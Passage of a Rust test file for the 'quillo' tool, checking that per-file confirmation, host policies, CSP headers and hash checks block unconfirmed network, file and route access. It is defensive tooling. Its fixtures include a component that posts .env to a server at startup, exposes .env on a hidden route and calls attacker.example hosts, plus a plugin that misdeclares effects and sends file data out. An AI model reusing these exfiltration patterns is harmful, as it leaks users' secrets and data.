//! FEEDBACK83.md (slice C of FEEDBACK82-85; branch feedback82-85): what a program's files reach,
//! confirmed once per project. Q-1300: `quillo confirm` and `quillo.confirmed`, and a run held to
//! it; Q-1301: a taken file's routes and work at start; Q-1302: `quillo check` holds written
//! addresses to the policy's hosts, and a refusal is logged; Q-1303: a held program's pages carry
//! a report-only content-security-policy; Q-1304: a confirmed script's integrity hash; Q-1305: a
//! plugin's effects line read against its code; Q-1306: `quillo install` and a copy with only an
//! effects line added; Q-1307: `quillo install` keeps the hash it checked; Q-1308: the `run`
//! effect; FEEDBACK82's Q-1285: `[plugins] catalog`; and the decided questions 5 and 6 (a
//! provider's policy asks for a complete `quillo.confirmed`, warning in this release).

mod support;

use std::io::{Read, Write};
use std::net::TcpListener;
use std::path::Path;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};
use support::{port_in_log, send, temp_dir, Guard};

/// `quillo` with `args` in `dir`, ended after `secs`: its exit code and what it wrote.
fn quillo_for(dir: &Path, args: &[&str], secs: u64) -> (Option<i32>, String) {
    let log = dir.join("cmd.log");
    let file = std::fs::File::create(&log).unwrap();
    let mut child = Command::new(env!("CARGO_BIN_EXE_quillo"))
        .args(args)
        .current_dir(dir)
        .env_remove("QUILLO_POLICY_PATH")
        .env_remove("CARGO_TARGET_DIR")
        .env("QUILLO_BUILT_RECORD_DIR", record_dir(dir))
        .env("QUILLO_SECRET", "test secret for the tests, 32 bytes or more")
        .stdin(Stdio::null())
        .stdout(file.try_clone().unwrap())
        .stderr(file)
        .spawn()
        .unwrap();
    let deadline = Instant::now() + Duration::from_secs(secs);
    let code = loop {
        if let Some(s) = child.try_wait().unwrap() {
            break s.code();
        }
        if Instant::now() > deadline {
            let _ = child.kill();
            let _ = child.wait();
            break None;
        }
        std::thread::sleep(Duration::from_millis(20));
    };
    (code, std::fs::read_to_string(&log).unwrap_or_default())
}

/// Where a test's program keeps the record of what its machine built (`native::built_record`):
/// beside its folder, never the user's own cache.
fn record_dir(dir: &Path) -> std::path::PathBuf {
    dir.with_file_name(format!("{}-built", dir.file_name().unwrap().to_string_lossy()))
}

fn quillo(dir: &Path, args: &[&str]) -> (Option<i32>, String) {
    quillo_for(dir, args, 60)
}

/// `quillo run` of main.qwe in `dir` on a port the system picks: the guard, the port, the log.
fn serve(dir: &Path, opts: &[&str]) -> (Guard, u16, std::path::PathBuf) {
    let log = dir.join("run.log");
    let file = std::fs::File::create(&log).unwrap();
    let child = Command::new(env!("CARGO_BIN_EXE_quillo"))
        .args(["run", "main.qwe", "--port", "0"])
        .args(opts)
        .current_dir(dir)
        .env_remove("QUILLO_POLICY_PATH")
        .env_remove("CARGO_TARGET_DIR")
        .env("QUILLO_BUILT_RECORD_DIR", record_dir(dir))
        .env("QUILLO_SECRET", "test secret for the tests, 32 bytes or more")
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(file)
        .spawn()
        .unwrap();
    let mut g = Guard::new(child);
    let port = port_in_log(&mut g.0, &log, Duration::from_secs(60));
    (g, port, log)
}

fn write(dir: &Path, name: &str, text: &str) {
    let p = dir.join(name);
    if let Some(d) = p.parent() {
        std::fs::create_dir_all(d).unwrap();
    }
    std::fs::write(p, text).unwrap();
}

fn read(p: &Path) -> String {
    std::fs::read_to_string(p).unwrap_or_default()
}

/// A stand-in for another server: counts what connects to it, for `secs`.
fn other_server() -> (u16, std::sync::Arc<std::sync::atomic::AtomicUsize>) {
    let l = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = l.local_addr().unwrap().port();
    let seen = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let s = seen.clone();
    std::thread::spawn(move || {
        for c in l.incoming().flatten() {
            s.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
            let mut c = c;
            c.set_read_timeout(Some(Duration::from_secs(2))).ok();
            let mut buf = [0u8; 4096];
            let _ = c.read(&mut buf);
            let _ = c.write_all(b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\nconnection: close\r\n\r\nok");
        }
    });
    (port, seen)
}

/// A server of fixed files, by path: a catalog, a CDN.
fn files_server(files: Vec<(&'static str, Vec<u8>)>) -> u16 {
    let l = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = l.local_addr().unwrap().port();
    std::thread::spawn(move || {
        for c in l.incoming().flatten() {
            let mut c = c;
            c.set_read_timeout(Some(Duration::from_secs(5))).ok();
            let mut buf = [0u8; 8192];
            let n = c.read(&mut buf).unwrap_or(0);
            let head = String::from_utf8_lossy(&buf[..n]).to_string();
            let path = head.split_whitespace().nth(1).unwrap_or("/").to_string();
            match files.iter().find(|(p, _)| *p == path) {
                Some((_, body)) => {
                    let _ = c.write_all(format!("HTTP/1.1 200 OK\r\ncontent-length: {}\r\nconnection: close\r\n\r\n", body.len()).as_bytes());
                    let _ = c.write_all(body);
                }
                None => {
                    let _ = c.write_all(b"HTTP/1.1 404 Not Found\r\ncontent-length: 0\r\nconnection: close\r\n\r\n");
                }
            }
        }
    });
    port
}

fn sha256_hex(b: &[u8]) -> String {
    use sha2::Digest;
    sha2::Sha256::digest(b).iter().map(|x| format!("{:02x}", x)).collect()
}

/// The report's A.1 program: a component file taken for one name, with `port` for "another
/// server".
fn probe(name: &str, port: u16) -> std::path::PathBuf {
    let d = temp_dir(name);
    write(&d, "main.qwe", "import kit/badge.qwe use Badge\n\nroute GET / = <html><body><h1>Shop</h1><Badge label=\"new\"/></body></html>\nroute GET /own = read_file(\"data/x.txt\") ?? \"none\"\n");
    write(
        &d,
        "kit/badge.qwe",
        &format!(
            "client \"https://cdn.attacker.example/x.js\" use X\n\nlet started = http.post(\"http://127.0.0.1:{}/boot\", {{ body: read_file(\".env\") ?? \"no .env\" }})\n\nroute GET /kit-debug = read_file(\".env\") ?? \"none\"\n\ncomponent Badge(label) {{\n    <span onmount={{(el) => {{\n        js(\"fetch\", \"https://collect.attacker.example/c?\" + str(js(\"document.title\")))\n        X.track(label)\n    }}}}>\n        {{label}}<img src=\"https://pixel.attacker.example/p.gif\" alt=\"\"/>\n    </span>\n}}\n",
            port
        ),
    );
    write(&d, "data/x.txt", "hi");
    write(&d, ".env", "STRIPE_KEY=sk_live_probe_not_real\n");
    d
}

// ---- Q-1300: the scan, quillo confirm, quillo.confirmed ----------------------------------------

#[test]
fn confirm_lists_what_each_file_reaches_and_writes_it() {
    let d = probe("c-confirm", 9);
    // Each kind of thing, by file and line; with no one to ask, nothing written.
    let (code, out) = quillo(&d, &["confirm"]);
    assert_eq!(code, Some(1), "{}", out);
    for want in ["2 files reach something not confirmed yet", "kit/badge.qwe", "reaches       127.0.0.1", "reads         .env", "lines 3, 5", "page script   https://cdn.attacker.example/x.js", "page loads    pixel.attacker.example", "page calls    collect.attacker.example", "adds a route  GET /kit-debug", "main.qwe", "data/x.txt", "--yes"] {
        assert!(out.contains(want), "{} in {}", want, out);
    }
    assert!(!d.join("quillo.confirmed").exists());
    // --list: everything, written nowhere.
    let (code, out) = quillo(&d, &["confirm", "--list"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(out.contains("note: kit/badge.qwe is taken for Badge"), "{}", out);
    assert!(!d.join("quillo.confirmed").exists());
    // --yes: written, read back the same, and nothing left to ask.
    let (code, out) = quillo(&d, &["confirm", "--yes"]);
    assert_eq!(code, Some(0), "{}", out);
    let text = read(&d.join("quillo.confirmed"));
    for want in ["[\"kit/badge.qwe\"]", "http = [\"127.0.0.1\"]", "files = [\".env\"]", "routes = [\"GET /kit-debug\"]", "[\"main.qwe\"]", "files = [\"data/x.txt\"]"] {
        assert!(text.contains(want), "{} in {}", want, text);
    }
    let (code, out) = quillo(&d, &["confirm"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(out.contains("everything the program's files reach is confirmed"), "{}", out);
    // check: no error, the taken file's warning stays.
    let (code, out) = quillo(&d, &["check", "main.qwe"]);
    assert_eq!(code, Some(0), "{}", out);
}

#[test]
fn check_lists_what_is_not_confirmed_once_there_is_a_file() {
    let d = temp_dir("c-check");
    write(&d, "main.qwe", "route GET / = http.get(\"https://api.example.com/x\")\n");
    // No file: check says nothing of it, as before.
    let (code, out) = quillo(&d, &["check", "main.qwe"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(!out.contains("confirm"), "{}", out);
    // An empty file: confirmed for nothing.
    write(&d, "quillo.confirmed", "# nothing yet\n");
    let (code, out) = quillo(&d, &["check", "main.qwe"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("main.qwe:1: error: reaches api.example.com: not confirmed for this file"), "{}", out);
    // One item, the one there is: ok. A subdomain pattern covers it; another host does not.
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nhttp = [\"*.example.com\"]\n");
    assert_eq!(quillo(&d, &["check", "main.qwe"]).0, Some(0));
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nhttp = [\"example.com\"]\n");
    assert_eq!(quillo(&d, &["check", "main.qwe"]).0, Some(1));
    // A broken file: said with its line, exit 2 at a start.
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nhosts = [\"x\"]\n");
    let (code, out) = quillo(&d, &["check", "main.qwe"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("quillo.confirmed: line 2: `hosts` is not something quillo.confirmed says"), "{}", out);
    let (code, out) = quillo_for(&d, &["run", "main.qwe", "--port", "0"], 30);
    assert_eq!(code, Some(2), "{}", out);
    assert!(out.contains("line 2"), "{}", out);
}

#[test]
fn a_run_is_held_to_what_was_confirmed() {
    let (other, seen) = other_server();
    let d = probe("c-held", other);
    // Only the main file confirmed: the taken file is confirmed for nothing.
    let (code, out) = quillo(&d, &["confirm", "main.qwe", "main.qwe", "--yes"]);
    assert_eq!(code, Some(1), "{}", out);
    let (g, port, log) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/own", &[], "").body, "hi");
    // Its route is not served, its script is left out, its post at start never left.
    assert_eq!(send(port, "GET", "/kit-debug", &[], "").status, 404);
    let page = send(port, "GET", "/", &[], "");
    assert!(!page.body.contains("cdn.attacker.example"), "{}", page.body);
    assert!(page.header("content-security-policy-report-only").is_some_and(|c| c.contains("connect-src 'self'") && !c.contains("attacker")), "{:?}", page.headers);
    std::thread::sleep(Duration::from_millis(300));
    assert_eq!(seen.load(std::sync::atomic::Ordering::SeqCst), 0);
    drop(g);
    let text = read(&log);
    for want in ["6 things in 1 file are not confirmed", "the script https://cdn.attacker.example/x.js is left out", "the path .env was refused", "a call to 127.0.0.1 was refused", "the route GET /kit-debug is not served"] {
        assert!(text.contains(want), "{} in {}", want, text);
    }
    // Said once each.
    assert_eq!(text.matches("the path .env was refused").count(), 1, "{}", text);
    // Everything confirmed: the post arrives, the route answers, the page names the script.
    assert_eq!(quillo(&d, &["confirm", "--yes"]).0, Some(0));
    let (g, port, _) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/kit-debug", &[], "").body, "STRIPE_KEY=sk_live_probe_not_real\n");
    let page = send(port, "GET", "/", &[], "");
    assert!(page.body.contains("https://cdn.attacker.example/x.js"), "{}", page.body);
    let csp = page.header("content-security-policy-report-only").unwrap_or_default().to_string();
    assert!(csp.contains("script-src 'self' 'unsafe-inline' cdn.attacker.example") && csp.contains("pixel.attacker.example") && csp.contains("connect-src 'self' collect.attacker.example"), "{}", csp);
    let until = Instant::now() + Duration::from_secs(5);
    while seen.load(std::sync::atomic::Ordering::SeqCst) == 0 && Instant::now() < until {
        std::thread::sleep(Duration::from_millis(20));
    }
    assert_eq!(seen.load(std::sync::atomic::Ordering::SeqCst), 1);
    drop(g);
}

#[test]
fn a_folder_is_confirmed_by_what_its_path_starts_with() {
    let d = temp_dir("c-folder");
    write(
        &d,
        "main.qwe",
        "route GET /up/:name = read_file(\"uploads/\" + name) ?? \"refused\"\nroute GET /raw = read_file(request.query.p) ?? \"refused\"\nroute GET /de = read_file(\"données/é.txt\") ?? \"refused\"\n",
    );
    write(&d, "uploads/a.txt", "a");
    write(&d, "uploadsX/a.txt", "x");
    write(&d, "données/é.txt", "é");
    write(&d, "secret.txt", "s");
    let (code, out) = quillo(&d, &["confirm", "--yes"]);
    assert_eq!(code, Some(0), "{}", out);
    let text = read(&d.join("quillo.confirmed"));
    assert!(text.contains("files = [\"données/é.txt\", \"uploads/\"]"), "{}", text);
    let (g, port, _) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/up/a.txt", &[], "").body, "a");
    assert_eq!(send(port, "GET", "/de", &[], "").body, "é");
    // The folder, by its parts: not a name that starts the same, nor a way out of it.
    for p in ["uploadsX/a.txt", "uploads/../secret.txt", "./secret.txt", "uploads"] {
        assert_eq!(send(port, "GET", &format!("/raw?p={}", p), &[], "").body, "refused", "{}", p);
    }
    assert_eq!(send(port, "GET", "/raw?p=uploads/a.txt", &[], "").body, "a");
    assert_eq!(send(port, "GET", "/raw?p=./uploads/a.txt", &[], "").body, "a");
    drop(g);
}

#[test]
fn an_item_no_longer_written_leaves_the_list_and_a_path_takes_only_its_files() {
    let d = temp_dir("c-stale");
    write(&d, "main.qwe", "use lib/a.qwe\nroute GET / = http.get(\"https://one.example/\")\n");
    write(&d, "lib/a.qwe", "fn a() = http.get(\"https://two.example/\")\n");
    // Only lib/: main.qwe stays unconfirmed.
    let (code, out) = quillo(&d, &["confirm", "main.qwe", "lib/", "--yes"]);
    assert_eq!(code, Some(1), "{}", out);
    let text = read(&d.join("quillo.confirmed"));
    assert!(text.contains("[\"lib/a.qwe\"]") && !text.contains("[\"main.qwe\"]"), "{}", text);
    assert_eq!(quillo(&d, &["confirm", "--yes"]).0, Some(0));
    // A host no longer written: the next confirm takes it out.
    write(&d, "lib/a.qwe", "fn a() = 1\n");
    let (code, out) = quillo(&d, &["confirm"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(out.contains("1 item no longer in the files left quillo.confirmed"), "{}", out);
    assert!(!read(&d.join("quillo.confirmed")).contains("two.example"));
}

#[test]
fn without_a_file_nothing_changes() {
    let (other, seen) = other_server();
    let d = probe("c-none", other);
    let (g, port, log) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/kit-debug", &[], "").status, 200);
    let page = send(port, "GET", "/", &[], "");
    assert!(page.header("content-security-policy-report-only").is_none());
    assert!(page.body.contains("cdn.attacker.example"));
    drop(g);
    assert!(!read(&log).contains("confirm"), "{}", read(&log));
    assert!(seen.load(std::sync::atomic::Ordering::SeqCst) >= 1);
}

#[cfg(unix)]
#[test]
fn a_terminal_is_asked_file_by_file() {
    let d = temp_dir("c-ask");
    write(&d, "main.qwe", "use lib/a.qwe\nroute GET / = http.get(\"https://one.example/\")\n");
    write(&d, "lib/a.qwe", "fn a() = http.get(\"https://two.example/\")\n");
    let (mut master, mut slave) = (0, 0);
    // SAFETY: openpty fills in two descriptors; no names or settings are given.
    assert_eq!(unsafe { libc::openpty(&mut master, &mut slave, std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut()) }, 0);
    use std::os::fd::FromRawFd;
    // SAFETY: each descriptor is this test's, and owned once.
    let (m, s) = unsafe { (std::fs::File::from_raw_fd(master), std::fs::File::from_raw_fd(slave)) };
    let mut child = Command::new(env!("CARGO_BIN_EXE_quillo"))
        .args(["confirm"])
        .current_dir(&d)
        .stdin(s.try_clone().unwrap())
        .stdout(s.try_clone().unwrap())
        .stderr(s)
        .spawn()
        .unwrap();
    let mut m2 = m.try_clone().unwrap();
    let out = std::sync::Arc::new(std::sync::Mutex::new(String::new()));
    let o = out.clone();
    std::thread::spawn(move || {
        let mut buf = [0u8; 4096];
        while let Ok(n) = m2.read(&mut buf) {
            if n == 0 {
                break;
            }
            o.lock().unwrap().push_str(&String::from_utf8_lossy(&buf[..n]));
        }
    });
    let mut m = m;
    let wait_for = |what: &str| {
        let until = Instant::now() + Duration::from_secs(20);
        while !out.lock().unwrap().contains(what) && Instant::now() < until {
            std::thread::sleep(Duration::from_millis(20));
        }
    };
    wait_for("[n] none: ");
    m.write_all(b"f\n").unwrap();
    wait_for("lib/a.qwe? [y/n]: ");
    m.write_all(b"y\n").unwrap();
    wait_for("main.qwe? [y/n]: ");
    m.write_all(b"n\n").unwrap();
    let until = Instant::now() + Duration::from_secs(20);
    let code = loop {
        if let Some(s) = child.try_wait().unwrap() {
            break s.code();
        }
        if Instant::now() > until {
            let _ = child.kill();
            break None;
        }
        std::thread::sleep(Duration::from_millis(20));
    };
    assert_eq!(code, Some(1), "{}", out.lock().unwrap());
    let text = read(&d.join("quillo.confirmed"));
    assert!(text.contains("two.example") && !text.contains("one.example"), "{}", text);
}

// ---- Q-1301: a taken file's routes and work at start ------------------------------------------

#[test]
fn a_file_taken_for_names_that_adds_routes_is_said() {
    let d = temp_dir("c-taken");
    write(&d, "main.qwe", "import ui.qwe use Card\nuse lib.qwe\nroute GET / = <Card/>\n");
    write(&d, "ui.qwe", "component Card() { <b>card</b> }\nroute GET /extra = \"x\"\n");
    write(&d, "lib.qwe", "route GET /lib = \"a library's own\"\nlet at_start = read_file(\"x.txt\")\n");
    let (code, out) = quillo(&d, &["check", "main.qwe"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(out.contains("ui.qwe:2: warning: ui.qwe is taken for Card, and also adds GET /extra"), "{}", out);
    // A file taken whole is a library: its routes are its own to have.
    assert!(!out.contains("lib.qwe is taken"), "{}", out);
    // One that only shows: nothing said.
    write(&d, "ui.qwe", "component Card() { <b>card</b> }\n");
    let (_, out) = quillo(&d, &["check", "main.qwe"]);
    assert!(!out.contains("is taken for"), "{}", out);
}

// ---- Q-1302: written addresses against the policy's hosts -------------------------------------

#[test]
fn check_holds_a_written_address_to_the_policy_hosts() {
    let d = temp_dir("c-hosts");
    write(
        &d,
        "main.qwe",
        "route GET /a = http.get(\"https://api.example.com/x\")\nroute GET /b = http.get(\"http://127.0.0.1:9/x\")\nroute GET /c/:h = http.get(\"https://\" + h + \"/x\")\nroute GET /d = http.post(`https://other.example/${1}`, {})\n",
    );
    write(&d, "p.toml", "[http]\nhosts = [\"api.example.com\"]\n");
    let (code, out) = quillo(&d, &["check", "main.qwe", "--policy", "p.toml"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("main.qwe:2: error: http: 127.0.0.1 is not among the hosts p.toml allows: api.example.com"), "{}", out);
    assert!(out.contains("main.qwe:4: error: http: other.example is not among the hosts"), "{}", out);
    // The allowed one, and one worked out, are not errors.
    assert!(!out.contains("main.qwe:1: error") && !out.contains("main.qwe:3: error"), "{}", out);
    // Several layers: each one's hosts; `*` and a subdomain pattern cover what they name.
    write(&d, "main.qwe", "route GET /a = http.get(\"https://api.example.com/x\")\nroute GET /b = http.get(\"https://x.other.example/\")\n");
    write(&d, "q.toml", "[http]\nhosts = [\"*.example.com\", \"*.other.example\"]\n");
    write(&d, "p.toml", "[http]\nhosts = [\"*\"]\n");
    let (code, out) = quillo(&d, &["check", "main.qwe", "--policy", "p.toml", "--policy", "q.toml"]);
    assert_eq!(code, Some(0), "{}", out);
    write(&d, "q.toml", "[http]\nhosts = [\"api.example.com\"]\n");
    let (code, out) = quillo(&d, &["check", "main.qwe", "--policy", "p.toml", "--policy", "q.toml"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("main.qwe:2: error: http: x.other.example is not among the hosts q.toml allows"), "{}", out);
}

#[test]
fn a_refusal_by_the_policy_is_logged_once_for_each_host() {
    let d = temp_dir("c-refused-log");
    write(&d, "main.qwe", "route GET / = http.get(\"https://\" + request.query.h + \"/x\").error ?? \"sent\"\n");
    write(&d, "p.toml", "[http]\nhosts = [\"api.example.com\"]\n");
    let (g, port, log) = serve(&d, &["--policy", "p.toml"]);
    for _ in 0..3 {
        assert!(send(port, "GET", "/?h=evil.example", &[], "").body.contains("not among the hosts"));
    }
    send(port, "GET", "/?h=other.example", &[], "");
    drop(g);
    let text = read(&log);
    assert_eq!(text.matches("a call to evil.example was refused").count(), 1, "{}", text);
    assert_eq!(text.matches("a call to other.example was refused").count(), 1, "{}", text);
}

// ---- Q-1303: the page's policy -----------------------------------------------------------------

#[test]
fn a_programs_own_page_policy_stands() {
    let d = temp_dir("c-own-csp");
    write(&d, "main.qwe", "site_headers({ \"content-security-policy\": \"default-src 'none'\" })\nroute GET / = <html><body>x</body></html>\nroute GET /t = \"text\"\n");
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n");
    let (g, port, _) = serve(&d, &[]);
    let page = send(port, "GET", "/", &[], "");
    assert_eq!(page.header("content-security-policy"), Some("default-src 'none'"));
    assert!(page.header("content-security-policy-report-only").is_none());
    // Not on what is no page.
    assert!(send(port, "GET", "/t", &[], "").header("content-security-policy-report-only").is_none());
    drop(g);
}

// ---- Q-1304: a confirmed script's integrity hash -----------------------------------------------

#[test]
fn a_confirmed_script_is_loaded_with_its_integrity_hash() {
    let js = b"window.L = 1;\n".to_vec();
    let cdn = files_server(vec![("/lib.js", js.clone())]);
    let d = temp_dir("c-sri");
    let url = format!("http://127.0.0.1:{}/lib.js", cdn);
    let gone = format!("http://127.0.0.1:{}/gone.js", cdn);
    write(
        &d,
        "main.qwe",
        &format!("client \"{}\" use L\nclient \"{}\" use G\ncomponent C() {{ <b onclick={{() => L.x() + G.y()}}>c</b> }}\nroute GET / = <html><body><C/></body></html>\n", url, gone),
    );
    let (code, out) = quillo(&d, &["confirm", "--yes"]);
    assert_eq!(code, Some(0), "{}", out);
    // One that cannot be fetched is confirmed without, and said.
    assert!(out.contains(&format!("{} could not be fetched for its integrity hash", gone)), "{}", out);
    use sha2::Digest;
    let want = format!("sha384-{}", quillo::crypto_b64(&sha2::Sha384::digest(&js)));
    let text = read(&d.join("quillo.confirmed"));
    assert!(text.contains(&format!("\"{} {}\"", url, want)) && text.contains(&format!("\"{}\"", gone)), "{}", text);
    let (g, port, _) = serve(&d, &[]);
    let page = send(port, "GET", "/", &[], "").body;
    assert!(page.contains(&format!("[\"{}\",\"{}\"]", url, want)), "{}", page);
    assert!(page.contains("t.integrity=s[1];t.crossOrigin=\"anonymous\""), "{}", page);
    assert!(page.contains(&format!("\"{}\"", gone)), "{}", page);
    drop(g);
}

// ---- Q-1305, Q-1308: a plugin's effects line read against its code -----------------------------

const REACH: &str = "//! Says hello.\n//! version: 1.0.0\n//! effects: none\n\nuse std::io::Write;\n\n/// A greeting.\npub fn greet(name: &str) -> String {\n    let hosts = std::fs::read_to_string(\"/etc/hosts\").unwrap_or_default();\n    if let Ok(mut s) = std::net::TcpStream::connect(\"127.0.0.1:9\") {\n        let _ = write!(s, \"{}\", hosts.len());\n    }\n    format!(\"hello, {}\", name)\n}\n";

#[test]
fn a_plugins_effects_line_is_read_against_its_code() {
    let d = temp_dir("c-effects");
    write(&d, "reach.qwer", REACH);
    write(&d, "main.qwe", "import reach.qwer use greet\nroute GET / = greet(\"Ana\")\n");
    let (code, out) = quillo(&d, &["check", "main.qwe"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(out.contains("reach.qwer:9: warning: reach.qwer says `effects: none`, and calls std::fs::read_to_string (line 9), std::net::TcpStream::connect (line 10): a reading of its text, not a proof"), "{}", out);
    let (code, out) = quillo(&d, &["confirm", "--effects", "reach.qwer"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.starts_with("reach.qwer: effects: fs, net\n"), "{}", out);
    // A line that says it: nothing to say. One that starts programs: `run`.
    write(&d, "ok.qwer", "//! version: 1.0.0\n//! effects: fs, net\npub fn a() -> String { std::fs::read_to_string(\"x\").unwrap_or_default() }\n");
    write(&d, "sh.qwer", "//! version: 1.0.0\n//! effects: none\nuse std::process::Command;\npub fn a() -> String { Command::new(\"sh\").output().map(|_| String::new()).unwrap_or_default() }\n");
    write(&d, "pure.qwer", "//! version: 1.0.0\npub fn a(n: i64) -> i64 { n + 1 }\n");
    let (code, out) = quillo(&d, &["confirm", "--effects", "ok.qwer", "sh.qwer", "pure.qwer"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("ok.qwer: effects: fs\n") && out.contains("sh.qwer: effects: run\n") && out.contains("Command::new (line 4)") && out.contains("pure.qwer: effects: none\n"), "{}", out);
    assert!(!out.contains("ok.qwer` says") && !out.contains("pure.qwer\n  but"), "{}", out);
    // Nothing to read: exit 2.
    assert_eq!(quillo(&d, &["confirm", "--effects"]).0, Some(2));
}

#[test]
fn the_run_effect_is_declared_and_refused_by_a_policy() {
    let d = temp_dir("c-run");
    write(&d, "sh.qwer", "//! version: 1.0.0\n//! effects: run\nuse std::process::Command;\npub fn a() -> String { Command::new(\"true\").output().map(|_| String::new()).unwrap_or_default() }\n");
    write(&d, "main.qwe", "import sh.qwer use a\nroute GET / = a()\n");
    let (code, out) = quillo(&d, &["check", "main.qwe"]);
    assert_eq!(code, Some(0), "{}", out);
    write(&d, "p.toml", "[effects]\nallow = [\"db\", \"http\", \"fs\", \"env\", \"time\", \"random\", \"net\"]\n");
    let (code, out) = quillo(&d, &["check", "main.qwe", "--policy", "p.toml"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("run"), "{}", out);
    write(&d, "p.toml", "[effects]\nallow = [\"run\"]\n");
    assert_eq!(quillo(&d, &["check", "main.qwe", "--policy", "p.toml"]).0, Some(0));
}

// ---- Q-1300, Q-1307: a plugin held to its hash -------------------------------------------------

#[test]
fn a_plugin_loads_only_at_its_confirmed_hash() {
    let d = temp_dir("c-plugin");
    write(&d, "hi.qwer", "//! version: 1.0.0\n//! effects: none\npub fn hi(n: &str) -> String { format!(\"hi {}\", n) }\n");
    write(&d, "main.qwe", "import hi.qwer use hi\nroute GET / = hi(\"Ana\")\n");
    // Not in the file: the start stops, before anything is built.
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n");
    let (code, out) = quillo(&d, &["run", "main.qwe", "--port", "0"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("hi.qwer is not confirmed (its SHA-256 is"), "{}", out);
    assert!(!d.join(".quillo/native").exists());
    assert_eq!(quillo(&d, &["confirm", "--yes"]).0, Some(0));
    let text = read(&d.join("quillo.confirmed"));
    assert!(text.contains(&format!("sha256 = \"{}\"", sha256_hex(read(&d.join("hi.qwer")).as_bytes()))) && text.contains("effects = \"none\""), "{}", text);
    // At its hash: built and served.
    let (g, port, _) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/", &[], "").body, "hi Ana");
    drop(g);
    // One byte more: not the file confirmed.
    write(&d, "hi.qwer", "//! version: 1.0.0\n//! effects: none\npub fn hi(n: &str) -> String { format!(\"hi {}!\", n) }\n");
    let (code, out) = quillo(&d, &["run", "main.qwe", "--port", "0"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("hi.qwer is not the file confirmed: its SHA-256 is"), "{}", out);
    let (code, out) = quillo(&d, &["check", "main.qwe"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("hi.qwer: error: hi.qwer is not the file confirmed"), "{}", out);
}

/// A catalog of one plugin, `hi`, at `text`.
fn catalog(text: &str) -> u16 {
    let index = format!(
        "{{\"format\":1,\"plugins\":[{{\"name\":\"hi\",\"title\":\"Hi\",\"version\":\"1.0.0\",\"summary\":\"s\",\"group\":\"g\",\"sha256\":\"{}\",\"file\":\"plugins/hi.qwer\",\"example\":\"\",\"files\":[]}}]}}",
        sha256_hex(text.as_bytes())
    );
    files_server(vec![("/plugins/index.json", index.into_bytes()), ("/plugins/hi.qwer", text.as_bytes().to_vec())])
}

#[test]
fn install_keeps_the_hash_it_checked_and_an_effects_line_is_no_change() {
    let v1 = "//! Says hi.\n//! version: 1.0.0\n//!\npub fn hi() -> String { \"hi\".into() }\n";
    let reg = format!("http://127.0.0.1:{}", catalog(v1));
    let d = temp_dir("c-install");
    // No quillo.confirmed: none made.
    let (code, out) = quillo(&d, &["install", "hi", "--registry", &reg]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(!d.join("quillo.confirmed").exists());
    // Only an effects line added, as a policy asks: still the catalog's file.
    write(&d, "hi.qwer", &v1.replace("//! version: 1.0.0\n", "//! version: 1.0.0\n//! effects: none\n"));
    let (code, out) = quillo(&d, &["install", "hi", "--registry", &reg]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(out.contains("hi 1.0.0 is up to date") && !out.contains("changed by hand"), "{}", out);
    assert!(read(&d.join("hi.qwer")).contains("//! effects: none"));
    // Anything else changed: kept as before.
    write(&d, "hi.qwer", &format!("{}// mine\n", v1));
    let (_, out) = quillo(&d, &["install", "hi", "--registry", &reg]);
    assert!(out.contains("changed by hand"), "{}", out);
    // With a quillo.confirmed: the plugin's block, with the hash it checked.
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n");
    let (code, out) = quillo(&d, &["install", "hi", "--registry", &reg, "--force"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(out.contains("quillo.confirmed keeps its SHA-256"), "{}", out);
    let text = read(&d.join("quillo.confirmed"));
    assert!(text.contains(&format!("[\"hi.qwer\"]\nsha256 = \"{}\"", sha256_hex(v1.as_bytes()))), "{}", text);
    // The catalog's file now has a line of its own: a copy without it is updated to it.
    let v2 = v1.replace("//! version: 1.0.0\n", "//! version: 1.0.0\n//! effects: none\n");
    let reg2 = format!("http://127.0.0.1:{}", catalog(&v2));
    let (code, out) = quillo(&d, &["install", "hi", "--registry", &reg2]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(out.contains("updated hi") && out.contains("its effects: none"), "{}", out);
    assert_eq!(read(&d.join("hi.qwer")), v2);
}

// ---- FEEDBACK82's Q-1285: only the catalog's plugins -------------------------------------------

#[test]
fn a_policy_takes_only_the_catalogs_plugins() {
    let d = temp_dir("c-catalog");
    let hi = "//! version: 1.0.0\n//! effects: none\npub fn hi() -> String { \"hi\".into() }\n";
    write(&d, "hi.qwer", hi);
